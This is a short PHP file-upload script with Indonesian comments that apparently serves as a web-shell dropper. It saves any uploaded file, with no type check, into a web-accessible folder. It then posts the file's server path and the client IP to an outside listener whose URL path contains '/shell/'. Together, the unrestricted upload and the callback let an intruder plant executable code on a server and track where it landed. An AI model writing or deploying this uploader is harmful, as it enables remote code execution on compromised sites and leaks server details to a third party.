<?php
if (isset($_FILES['upload'])) {
    // Menentukan folder upload (bisa diganti, dinamis, atau dari logic aplikasi)
    $upload_dir = __DIR__ . '/files/'; // contoh: folder uploads di root script
    if (!file_exists($upload_dir)) {
        mkdir($upload_dir, 0755, true); // bikin folder jika belum ada
    }
    $file_name = basename($_FILES['upload']['name']);
    $target_path = $upload_dir . $file_name;

    // Proses upload file
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $target_path)) {
        $uploaded_path = realpath($target_path);

        // Kirim laporan otomatis ke listener/report endpoint
        $data = json_encode([
            'uploaded_path' => $uploaded_path,
            'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            'timestamp' => date('Y-m-d H:i:s')
        ]);
        $listener_url = 'https://obeydasupreme.site/shell/reporter_listener.php';

        $ch = curl_init($listener_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        $listener_response = curl_exec($ch);
        curl_close($ch);

        // Log lokal jika perlu (optional)
        file_put_contents(__DIR__ . '/log_upload.txt',
            "[" . date('Y-m-d H:i:s') . "] $uploaded_path | $listener_response\n",
            FILE_APPEND);

        // Output sukses ke browser (opsional)
        echo "Upload sukses ke: <b>$uploaded_path</b><br>";
        echo "Listener respons: <pre>$listener_response</pre>";
    } else {
        echo "Upload gagal!";
    }
} else {
    // Tampilkan form upload sederhana jika script diakses langsung
    echo '<form enctype="multipart/form-data" method="POST">
    <input type="file" name="upload"><button type="submit">Upload & Report</button></form>';
}
?>
